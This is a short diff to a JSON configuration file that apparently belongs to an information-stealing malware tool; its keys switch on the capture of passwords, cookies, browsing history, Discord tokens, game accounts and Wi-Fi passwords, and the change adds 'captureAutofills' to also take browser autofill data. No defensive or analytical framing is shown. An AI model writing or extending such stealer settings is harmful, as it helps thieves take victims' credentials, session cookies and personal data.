@@ -18,6 +18,7 @@
         "capturePasswords" : true,
         "captureCookies" : true,
         "captureHistory" : true,
+        "captureAutofills" : true,
         "captureDiscordTokens" : true,
         "captureGames" : true,
         "captureWifiPasswords" : true,
